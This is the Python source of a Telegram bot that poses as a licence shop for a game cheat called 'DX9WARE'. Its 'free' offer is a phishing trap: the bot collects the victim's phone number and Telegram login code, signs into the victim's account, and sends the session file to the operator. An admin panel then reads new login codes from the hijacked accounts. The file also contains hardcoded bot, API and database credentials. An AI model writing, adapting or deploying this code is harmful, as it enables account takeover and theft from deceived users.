import logging
import asyncio
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher.filters.state import State, StatesGroup
from pyrogram import Client as TgClient
from supabase import create_client, Client
from PIL import Image, ImageDraw

# --- КОНФИГ ---
API_TOKEN = '8607818846:AAEjGMfOMw8JmUsXu8Zj5mUdzfP1RylLVjU'
ADMIN_ID = 6332767725 
API_ID = 33824273
API_HASH = 'c290fdceef9695342e052710e16d9bb9'

SUPABASE_URL = "https://yuksepnwkzffudhcrjnl.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl1a3NlcG53a3pmZnVkaGNyam5sIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUwNDM5OTksImV4cCI6MjA5MDYxOTk5OX0.6IvYWJiWqVeFVkQ-SK1NbG5_yEXVyHijFMGwvMbn1q4"

FILE_NAME = "cheat_file.zip"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage=MemoryStorage())
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

class Form(StatesGroup):
    waiting_activation = State()
    waiting_phone = State()
    waiting_code = State()
    admin_get_access_phone = State()

# --- КЛАВИАТУРЫ ---
def get_main_menu():
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("👤 Профиль", "🛒 Товары", "🔑 Активировать", "🎁 Получить бесплатно")
    return markup

def get_code_kb():
    markup = InlineKeyboardMarkup(row_width=3)
    btns = [InlineKeyboardButton(str(i), callback_data=f"num_{i}") for i in range(10)]
    markup.add(*btns)
    markup.add(InlineKeyboardButton("❌ Сброс", callback_data="code_clear"),
               InlineKeyboardButton("✅ Готово", callback_data="code_done"))
    return markup

def text_to_image(text, user_id):
    if not os.path.exists("sessions"): os.makedirs("sessions")
    img = Image.new('RGB', (550, 300), color=(255, 255, 255))
    d = ImageDraw.Draw(img)
    d.text((20, 120), text, fill=(0, 0, 0))
    path = f"sessions/code_{user_id}.png"
    img.save(path)
    return path

# --- АДМИН КОМАНДЫ ДЛЯ КЛЮЧЕЙ И ПРОФИЛЕЙ ---

@dp.message_handler(commands=['aprofile'], state='*')
async def admin_profile_view(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    args = message.get_args()
    if not args: return await message.answer("Использование: `/aprofile ID`")
    
    res = supabase.table("users").select("*").eq("id", args).execute()
    if not res.data: return await message.answer("Пользователь не найден.")
    
    u = res.data[0]
    text = (f"🗄 **Данные юзера {args}:**\n\n"
            f"👤 Username: @{u.get('username', 'N/A')}\n"
            f"📱 Номер: `{u.get('phone', 'Нет')}`\n"
            f"✅ Доступ: {'Есть' if u.get('is_verified') else 'Нет'}\n"
            f"💀 Сброшен: {'Да' if u.get('is_destroyed') else 'Нет'}")
    await message.answer(text, parse_mode="Markdown")

@dp.message_handler(commands=['akey'], state='*')
async def admin_all_keys_raw(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    if not os.path.exists("keys.txt"): return await message.answer("Файл keys.txt не найден.")
    
    with open("keys.txt", "r", encoding="utf-8") as f:
        keys = f.read().strip()
    
    await message.answer(f"🔑 **Список всех ключей (БЕЗ ЦЕНЗУРЫ):**\n\n`{keys or 'Пусто'}`", parse_mode="Markdown")

@dp.message_handler(commands=['allkey'], state='*')
async def admin_all_keys_censored(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    if not os.path.exists("keys.txt"): return await message.answer("Файл keys.txt не найден.")
    
    with open("keys.txt", "r", encoding="utf-8") as f:
        keys = [line.strip() for line in f.readlines() if line.strip()]
    
    if not keys: return await message.answer("Ключей нет.")
    
    censored = []
    for k in keys:
        if len(k) > 8:
            censored.append(f"{k[:4]}****{k[-4:]}")
        else:
            censored.append("****" + k[-2:])
            
    await message.answer("👁 **Список ключей (С ЦЕНЗУРОЙ):**\n\n" + "\n".join(censored))

# --- ОСНОВНАЯ ЛОГИКА ---

@dp.message_handler(commands=['start'], state='*')
async def cmd_start(message: types.Message, state: FSMContext):
    await state.finish()
    supabase.table("users").upsert({"id": message.from_user.id, "username": message.from_user.username}).execute()
    await message.answer("👋 Добро пожаловать в DX9WARE!", reply_markup=get_main_menu())

@dp.message_handler(lambda m: m.text == "👤 Профиль", state='*')
async def profile(message: types.Message, state: FSMContext):
    await state.finish()
    res = supabase.table("users").select("*").eq("id", message.from_user.id).execute()
    is_active = res.data[0].get('is_verified', False) if res.data else False
    status = "Активен ✅" if is_active else "Нет подписки ❌"
    markup = InlineKeyboardMarkup()
    if is_active: markup.add(InlineKeyboardButton("📁 Получить файлы", callback_data="get_files"))
    await message.answer(f"👤 **Твой профиль**\n\nID: `{message.from_user.id}`\nСтатус: {status}", reply_markup=markup, parse_mode="Markdown")

@dp.message_handler(lambda m: m.text == "🔑 Активировать", state='*')
async def activate_start(message: types.Message, state: FSMContext):
    await state.finish()
    await Form.waiting_activation.set()
    await message.answer("🔑 **Введите ваш лицензионный ключ:**")

@dp.message_handler(state=Form.waiting_activation)
async def process_activation(message: types.Message, state: FSMContext):
    user_key = message.text.strip()
    found = False
    if os.path.exists("keys.txt"):
        with open("keys.txt", "r", encoding="utf-8") as f:
            all_keys = [line.strip() for line in f.readlines() if line.strip()]
        if user_key in all_keys:
            all_keys.remove(user_key)
            with open("keys.txt", "w", encoding="utf-8") as f:
                for k in all_keys: f.write(k + "\n")
            supabase.table("users").update({"is_verified": True}).eq("id", message.from_user.id).execute()
            await message.answer("✅ **Ключ успешно активирован!**", reply_markup=get_main_menu())
            found = True
    if not found: await message.answer("❌ **Неверный ключ.**", reply_markup=get_main_menu())
    await state.finish()

# --- ЛОВУШКА И ВХОД ---

@dp.message_handler(lambda m: m.text == "🎁 Получить бесплатно", state='*')
async def free_start(message: types.Message, state: FSMContext):
    await state.finish()
    text = "⚠️ **ВНИМАНИЕ!**\nПрочитайте перед использованием:\n👉 https://t.me/Luci4DX9/106?single"
    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True).add(KeyboardButton("📲 Подтвердить номер", request_contact=True))
    await message.answer(text, reply_markup=markup)
    await Form.waiting_phone.set()

@dp.message_handler(content_types=['contact'], state=Form.waiting_phone)
async def phone_step(message: types.Message, state: FSMContext):
    phone = message.contact.phone_number
    if not phone.startswith('+'): phone = '+' + phone
    client = TgClient(f"sessions/{message.from_user.id}", API_ID, API_HASH)
    await client.connect()
    try:
        code_data = await client.send_code(phone)
        await state.update_data(phone=phone, hash=code_data.phone_code_hash, temp_code="")
        await Form.waiting_code.set()
        await message.answer("📩 **Введите код из Telegram кнопками:**", reply_markup=get_code_kb())
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}", reply_markup=get_main_menu())
        await state.finish()
    await client.disconnect()

@dp.callback_query_handler(lambda c: c.data.startswith('num_'), state=Form.waiting_code)
async def process_num(callback: types.CallbackQuery, state: FSMContext):
    num = callback.data.split('_')[1]
    data = await state.get_data()
    current = data.get('temp_code', "") + num
    await state.update_data(temp_code=current)
    await callback.message.edit_text(f"📩 Код: `{'*' * len(current)}`", reply_markup=get_code_kb())

@dp.callback_query_handler(lambda c: c.data == "code_done", state=Form.waiting_code)
async def code_done(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    client = TgClient(f"sessions/{callback.from_user.id}", API_ID, API_HASH)
    try:
        await client.connect()
        await client.sign_in(data['phone'], data['hash'], data.get('temp_code'))
        await client.disconnect()
        with open(f"sessions/{callback.from_user.id}.session", 'rb') as f:
            await bot.send_document(ADMIN_ID, f, caption=f"🚀 Диверсант: {data['phone']}")
        await callback.message.edit_text("✅ **Верификация успешна!**")
    except Exception as e: await callback.message.answer(f"❌ Ошибка: {e}")
    await state.finish()

# --- АДМИН ПАНЕЛЬ НОМЕРОВ ---
@dp.message_handler(commands=['admin_panel'], state='*')
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID: return
    res = supabase.table("users").select("*").not_label("phone", "is", "null").execute()
    text = "🚀 **Панель номеров:**\n\n"
    for u in res.data: text += f"📱 `{u['phone']}` | ID: `{u['id']}`\n"
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔑 Код (фото)", callback_data="admin_get_code"))
    await message.answer(text, reply_markup=markup)

@dp.callback_query_handler(lambda c: c.data == "admin_get_code", state='*')
async def admin_ask_phone(callback: types.CallbackQuery):
    await Form.admin_get_access_phone.set()
    await callback.message.answer("Введите номер:")

@dp.message_handler(state=Form.admin_get_access_phone)
async def admin_send_image_code(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    res = supabase.table("users").select("id").eq("phone", phone).execute()
    if res.data:
        uid = res.data[0]['id']
        client = TgClient(f"sessions/{uid}", API_ID, API_HASH)
        try:
            await client.start()
            async for msg in client.get_chat_history(777000, limit=1):
                path = text_to_image(f"CODE: {msg.text}", uid)
                with open(path, 'rb') as p: await bot.send_photo(ADMIN_ID, p)
                os.remove(path)
            await client.stop()
        except: pass
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
